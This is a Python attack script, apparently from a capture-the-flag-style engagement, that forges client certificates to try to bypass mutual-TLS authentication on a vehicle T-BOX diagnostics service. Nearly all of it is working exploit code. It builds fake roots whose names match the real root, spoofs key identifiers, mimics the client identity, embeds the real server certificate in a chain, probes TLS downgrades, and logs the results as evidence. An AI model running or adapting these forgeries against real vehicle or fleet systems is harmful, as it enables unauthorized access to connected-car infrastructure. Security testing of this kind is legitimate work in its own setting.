#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""T-BOX 8443 mTLS matrix, round 2 (v10..v16) + protocol-level bypass probes.

Round 1 (mtls_matrix.py / evidence 0005) covered: Ed25519 self-sign, RSA2048
self-sign, self-signed CA:TRUE leaf, same-DN fake CA (leaf-only and +chain),
same-DN fake CA with forged SKI, real-root-CN presented as the client cert,
X.509v1 no-extension cert, expired cert, leaf without EKU.

Round 2 adds only vectors that could still plausibly matter:
  v10  3-deep chain  leaf <- fake intermediate(CA:TRUE) <- fake root(CA:TRUE, real DN)
  v11  duplicated leaf in the chain (leaf sent twice)
  v12  identity mimic: CN=tbox + OU/O + EKU clientAuth + SAN dNSName=tbox, self-signed
  v13  VPN client cert + VPN CA (re-verify the shipped material end to end)
  v14  chain carrying the REAL server leaf as an intermediate (CA:FALSE issuer)
  v15  maximal string-level spoof: issuer DN = real root, AKI = real root SKI,
       own SKI = real root SKI, self-signed
  v16  EKU = anyExtendedKeyUsage only, issued by same-DN fake root
And record-level probes: TLS1.2/1.1 offer, NewSessionTicket presence, bogus
session-ticket replay.

Usage: python mtls_matrix2.py
"""
import datetime
import hashlib
import json
import os
import re
import socket
import ssl

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

HOST, PORT = "10.230.164.3", 8443
HERE = os.path.dirname(os.path.abspath(__file__))
MAT = os.path.join(HERE, "mat2")
ROOT = r"D:\qwb"
REAL_ROOT_CN = "CV6 Fleet Diagnostics Root"
REAL_ROOT_SKI_HEX = "476e90164f6470bb1c807236ab3c547003781099"
REQ = b"GET / HTTP/1.1\r\nHost: tbox\r\nUser-Agent: tbox-mtls-probe2\r\nConnection: close\r\n\r\n"
os.makedirs(MAT, exist_ok=True)

results = []


def w(name, blob):
    p = os.path.join(MAT, name)
    with open(p, "wb") as f:
        f.write(blob)
    return p


def kp(k):
    return k.private_bytes(serialization.Encoding.PEM,
                           serialization.PrivateFormat.PKCS8,
                           serialization.NoEncryption())


def cp(c):
    return c.public_bytes(serialization.Encoding.PEM)


def wk(name, key):
    return w(name, kp(key))


def nm(cn, ou=None, o=None):
    a = [x509.NameAttribute(NameOID.COMMON_NAME, cn)]
    if ou:
        a.insert(0, x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, ou))
    if o:
        a.insert(0, x509.NameAttribute(NameOID.ORGANIZATION_NAME, o))
    return x509.Name(a)


def mk(subject, key, issuer=None, issuer_key=None, ca=False,
       eku=None, san=None, days=30, ski=None, aki=None):
    now = datetime.datetime.now(datetime.timezone.utc)
    b = (x509.CertificateBuilder()
         .subject_name(subject)
         .issuer_name(issuer if issuer is not None else subject)
         .public_key(key.public_key())
         .serial_number(x509.random_serial_number())
         .not_valid_before(now - datetime.timedelta(days=1))
         .not_valid_after(now + datetime.timedelta(days=days))
         .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True))
    if ca:
        b = b.add_extension(x509.KeyUsage(
            digital_signature=True, content_commitment=False, key_encipherment=False,
            data_encipherment=False, key_agreement=False, key_cert_sign=True,
            crl_sign=True, encipher_only=False, decipher_only=False), critical=True)
    else:
        b = b.add_extension(x509.KeyUsage(
            digital_signature=True, content_commitment=False, key_encipherment=False,
            data_encipherment=False, key_agreement=False, key_cert_sign=False,
            crl_sign=False, encipher_only=False, decipher_only=False), critical=True)
    if eku:
        b = b.add_extension(x509.ExtendedKeyUsage(eku), critical=False)
    if ski is not None:
        b = b.add_extension(x509.SubjectKeyIdentifier(ski), critical=False)
    if aki is not None:
        b = b.add_extension(x509.AuthorityKeyIdentifier(aki, None, None), critical=False)
    if san:
        b = b.add_extension(x509.SubjectAlternativeName([x509.DNSName(s) for s in san]),
                            critical=False)
    return b.sign(issuer_key if issuer_key is not None else key, hashes.SHA256())


def build_mats():
    mats = {}

    # v10: 3-deep chain
    root_k = ec.generate_private_key(ec.SECP256R1())
    root = mk(nm(REAL_ROOT_CN), root_k, ca=True, days=60)
    inter_k = ec.generate_private_key(ec.SECP256R1())
    inter = mk(nm("CV6 Fleet Diagnostics Intermediate"), inter_k,
               issuer=nm(REAL_ROOT_CN), issuer_key=root_k, ca=True, days=60)
    leaf_k = ec.generate_private_key(ec.SECP256R1())
    leaf = mk(nm("tbox-client"), leaf_k, issuer=nm("CV6 Fleet Diagnostics Intermediate"),
              issuer_key=inter_k, eku=[ExtendedKeyUsageOID.CLIENT_AUTH])
    mats["v10_depth3_chain"] = (w("v10_chain.pem", cp(leaf) + cp(inter) + cp(root)), wk("v10.key", leaf_k))

    # v11: duplicated leaf
    mats["v11_dup_leaf"] = (w("v11_chain.pem", cp(leaf) + cp(leaf) + cp(inter) + cp(root)),
                            wk("v11.key", leaf_k))

    # v12: identity mimic, self-signed
    k12 = ec.generate_private_key(ec.SECP256R1())
    c12 = mk(nm("tbox", ou="Fleet Diagnostics", o="CyberCar"), k12, days=30,
             eku=[ExtendedKeyUsageOID.CLIENT_AUTH], san=["tbox"])
    mats["v12_identity_mimic"] = (w("v12.pem", cp(c12)), wk("v12.key", k12))

    # v13: VPN material as shipped
    mats["v13_vpn_cert_chain"] = (os.path.join(ROOT, r"01_TARGETS\tbox\vpn_client_chain.pem"),
                                  os.path.join(ROOT, r"01_TARGETS\tbox\vpn_client_key.pem"))

    # v14: chain embedding the REAL server leaf as intermediate
    srv_pem = open(os.path.join(ROOT, r"04_SOLVE\tbox\mat\srv_leaf.pem"), "rb").read()
    k14 = ec.generate_private_key(ec.SECP256R1())
    c14 = mk(nm("tbox-client"), k14, issuer=nm("tbox"), issuer_key=k14,
             eku=[ExtendedKeyUsageOID.CLIENT_AUTH])
    mats["v14_srvleaf_as_intermediate"] = (w("v14_chain.pem", cp(c14) + srv_pem), wk("v14.key", k14))

    # v15: maximal string-level spoof (issuer DN + AKI + own SKI all = real root)
    k15 = ec.generate_private_key(ec.SECP256R1())
    c15 = mk(nm("tbox-client"), k15, issuer=nm(REAL_ROOT_CN), issuer_key=k15,
             eku=[ExtendedKeyUsageOID.CLIENT_AUTH], san=["tbox"],
             ski=x509.SubjectKeyIdentifier.from_public_key(k15.public_key()).digest,
             aki=bytes.fromhex(REAL_ROOT_SKI_HEX))
    mats["v15_max_string_spoof"] = (w("v15.pem", cp(c15)), wk("v15.key", k15))

    # v16: anyEKU only, issued by same-DN fake root
    ca_k = ec.generate_private_key(ec.SECP256R1())
    ca = mk(nm(REAL_ROOT_CN), ca_k, ca=True, days=60)
    k16 = ec.generate_private_key(ec.SECP256R1())
    c16 = mk(nm("tbox-client"), k16, issuer=nm(REAL_ROOT_CN), issuer_key=ca_k,
             eku=[ExtendedKeyUsageOID.ANY_EXTENDED_KEY_USAGE])
    mats["v16_anyeku_chain"] = (w("v16_chain.pem", cp(c16) + cp(ca)), wk("v16.key", k16))
    return mats


def attempt(tag, cert=None, key=None, sni="tbox", minv=None, maxv=None,
            send_after=True):
    out = {"tag": tag, "sni": sni, "cert": os.path.basename(cert) if cert else None}
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if minv:
        ctx.minimum_version = minv
    if maxv:
        ctx.maximum_version = maxv
    try:
        if cert:
            ctx.load_cert_chain(cert, key)
    except Exception as e:
        out["local_error"] = "%s: %s" % (type(e).__name__, e)
        results.append(out)
        return out
    try:
        raw = socket.create_connection((HOST, PORT), timeout=8)
    except Exception as e:
        out["connect_error"] = repr(e)
        results.append(out)
        return out
    try:
        ss = ctx.wrap_socket(raw, server_hostname=sni if sni else None)
        out["handshake"] = "OK"
        out["tls"] = ss.version()
        out["cipher"] = ss.cipher()[0]
        der = ss.getpeercert(binary_form=True)
        out["peer_sha256"] = hashlib.sha256(der).hexdigest()
        out["alpn"] = ss.selected_alpn_protocol()
        try:
            out["ticket"] = bool(ss.session.has_ticket)
        except Exception:
            pass
        if send_after:
            try:
                ss.sendall(REQ)
                data = ss.recv(4096)
                out["http_response"] = data[:400].decode("utf-8", "replace")
            except Exception as e:
                out["io_error"] = "%s: %s" % (type(e).__name__, e)
        ss.close()
    except ssl.SSLError as e:
        out["alert"] = "%s: %s" % (getattr(e, "reason", "?"), e)
    except Exception as e:
        out["error"] = "%s: %s" % (type(e).__name__, e)
    finally:
        try:
            raw.close()
        except Exception:
            pass
    results.append(out)
    return out


def main():
    print("### materials")
    mats = build_mats()
    for k, v in mats.items():
        print(" ", k, "->", os.path.basename(str(v[0])), os.path.basename(str(v[1])))

    print("\n### A. client-cert constructions (TLS1.3)")
    for tag, (c, key) in sorted(mats.items()):
        r = attempt(tag, c, key)
        print(json.dumps(r, ensure_ascii=False))

    print("\n### B. protocol-level")
    print(json.dumps(attempt("B1_no_cert_tls13"), ensure_ascii=False))
    print(json.dumps(attempt("B2_tls12_offer", maxv=ssl.TLSVersion.TLSv1_2),
                     ensure_ascii=False))
    print(json.dumps(attempt("B3_tls12_offer_with_v12_cert",
                             cert=mats["v12_identity_mimic"][0],
                             key=mats["v12_identity_mimic"][1],
                             maxv=ssl.TLSVersion.TLSv1_2), ensure_ascii=False))

    outp = os.path.join(ROOT, r"03_EVIDENCE\tbox\0103_mtls_matrix2.json")
    with open(outp, "w", encoding="utf-8", newline="\n") as f:
        for r in results:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print("\nwrote", outp, len(results), "records")


if __name__ == "__main__":
    main()
